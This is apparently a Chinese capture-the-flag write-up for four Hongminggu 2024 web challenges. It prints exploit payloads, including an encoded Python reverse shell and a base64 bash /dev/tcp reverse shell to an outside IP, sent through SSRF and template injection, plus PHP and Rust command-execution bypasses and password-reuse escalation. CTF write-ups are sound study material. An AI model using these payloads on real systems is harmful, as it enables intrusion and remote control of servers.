# 红明谷-2024-Web

  
  
&lt;!--more--&gt;  
## ezphp  
```php  
&lt;?php  
highlight_file(__FILE__);  
// flag.php  
if (isset($_POST[&#39;f&#39;])) {  
    echo hash_file(&#39;md5&#39;, $_POST[&#39;f&#39;]);  
}  
?&gt;  
```  
利用此篇文章的方法，读取文件  
https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle  
```php  
&lt;?php  
if (isset($_GET[&#39;ezphpPhp8&#39;])) {  
    highlight_file(__FILE__);  
} else {  
    die(&#34;No&#34;);  
}  
$a = new class {  
    function __construct()  
    {  
    }  
  
    function getflag()  
    {  
        system(&#39;cat /flag&#39;);  
    }  
};  
unset($a);  
$a = $_GET[&#39;ezphpPhp8&#39;];  
$f = new $a();  
$f-&gt;getflag();  
?&gt;  
```  
匿名类的利用  
https://hi-arkin.com/archives/php-anonymous-stdClass.html  
`/flag.php?ezphpPhp8=class%40anonymous%00/var/www/html/flag.php%3A7%240`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031633826.png)
  
## playground  
访问`/www.zip`，得到  
```log  
[2022-01-01 12:34:56]  Authentication successful - User: admin Pass: 2e525e29e465f45d8d7c56319fe73036  
```  
替换`Authorization: Basic YWRtaW46MmU1MjVlMjllNDY1ZjQ1ZDhkN2M1NjMxOWZlNzMwMzY=`  
利用`readfile`得到`disable_function`  
```ini  
eval,assert,fwrite,file_put_contents,phpinfo,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,lin,putenv,mail,chroot,chgrp,dl,readlink  
```  
`pcntl_exec`没有被过滤，利用`Python`反弹`shell`  
```php  
/?cmd=pcntl_exec(&#39;/usr/bin/python&#39;,[&#39;-c&#39;,&#39;%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%32%34%2e%32%32%30%2e%32%31%35%2e%38%22%2c%31%32%33%34%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%69%6d%70%6f%72%74%20%70%74%79%3b%20%70%74%79%2e%73%70%61%77%6e%28%22%73%68%22%29&#39;]);  
```  
但是`flag`为`admin`权限需要提权  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031615181.png)
在`config.inc.php`里面发现密码，但是并没有开启相关服务，  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031327074.png)
在`/etc/passwd`中发现`admin`用户，猜测可能密码复用，利用su进行提权  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031327939.png)
## unauth  
```rust  
#[macro_use] extern crate rocket;  
  
use std::fs;  
use std::fs::File;  
use std::io::Write;  
use std::process::Command;  
use rand::Rng;  
  
#[get(&#34;/&#34;)]  
fn index() -&gt; String {  
    fs::read_to_string(&#34;main.rs&#34;).unwrap_or(String::default())  
}  
  
#[post(&#34;/rust_code&#34;, data = &#34;&lt;code&gt;&#34;)]  
fn run_rust_code(code: String) -&gt; String{  
    if code.contains(&#34;std&#34;) {  
        return &#34;Error: std is not allowed&#34;.to_string();  
    }  
    //generate a random 5 length file name  
    let file_name = rand::thread_rng()  
        .sample_iter(&amp;rand::distributions::Alphanumeric)  
        .take(5)  
        .map(char::from)  
        .collect::&lt;String&gt;();  
    if let Ok(mut file) = File::create(format!(&#34;playground/{}.rs&#34;, &amp;file_name)) {  
        file.write_all(code.as_bytes());  
    }  
    if let Ok(build_output) = Command::new(&#34;rustc&#34;)  
        .arg(format!(&#34;playground/{}.rs&#34;,&amp;file_name))  
        .arg(&#34;-C&#34;)  
        .arg(&#34;debuginfo=0&#34;)  
        .arg(&#34;-C&#34;)  
        .arg(&#34;opt-level=3&#34;)  
        .arg(&#34;-o&#34;)  
        .arg(format!(&#34;playground/{}&#34;,&amp;file_name))  
        .output() {  
        if !build_output.status.success(){  
            fs::remove_file(format!(&#34;playground/{}.rs&#34;,&amp;file_name));  
            return String::from_utf8_lossy(build_output.stderr.as_slice()).to_string();  
        }  
    }  
    fs::remove_file(format!(&#34;playground/{}.rs&#34;,&amp;file_name));  
    if let Ok(output) = Command::new(format!(&#34;playground/{}&#34;,&amp;file_name))  
        .output() {  
        if !output.status.success(){  
            fs::remove_file(format!(&#34;playground/{}&#34;,&amp;file_name));  
            return String::from_utf8_lossy(output.stderr.as_slice()).to_string();  
        } else{  
            fs::remove_file(format!(&#34;playground/{}&#34;,&amp;file_name));  
            return String::from_utf8_lossy(output.stdout.as_slice()).to_string();  
        }  
    }  
    return String::default();  
  
}  
  
#[launch]  
fn rocket() -&gt; _ {  
    let figment = rocket::Config::figment()  
        .merge((&#34;address&#34;, &#34;0.0.0.0&#34;));  
    rocket::custom(figment).mount(&#34;/&#34;, routes![index,run_rust_code])  
}  
```  
限制了`std`，利用内联写C进行绕过  
```c  
extern &#34;C&#34; {fn system(s: *const u8) -&gt; i32;}  
fn main() {  
		unsafe{system(b&#34;cat /flag&#34; as *const u8)};  
}  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031345685.png)
## Simp1escape  
CurlController下存在SSRF漏洞，但是限制了不能是本地IP，利用302跳转绕过  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031551190.png)
结合`AdminController`存在`Thymelaef`模版注入(只允许本地访问)  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031551557.png)
打一发模版注入漏洞  
https://boogipop.com/2024/01/29/RealWorld%20CTF%206th%20%E6%AD%A3%E8%B5%9B_%E4%BD%93%E9%AA%8C%E8%B5%9B%20%E9%83%A8%E5%88%86%20Web%20Writeup/#chatterbox%EF%BC%88solved%EF%BC%89  
`exp.php`  
```php  
&lt;?php  
header(&#34;Location:http://127.0.0.1:8080/getsites?hostname=%5B%5B%24%7BT(java.lang.Boolean).forName(%22com.fasterxml.jackson.databind.ObjectMapper%22).newInstance().readValue(%22%7B%7D%22%2CT(org.springframework.expression.spel.standard.SpelExpressionParser)).parseExpression(%22T(Runtime).getRuntime().exec(&#39;bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjQuMjIwLjIxNS44LzEyMzQgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D&#39;)%22).getValue()%7D%5D%5D&#34;);  
?&gt;  
```  
`/curl?url=http://ip:80/exp.php`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202404031758242.png)
  

---

> Author: N1Rvana  
> URL: http://localhost:1313/%E7%BA%A2%E6%98%8E%E8%B0%B7-2024-web/  

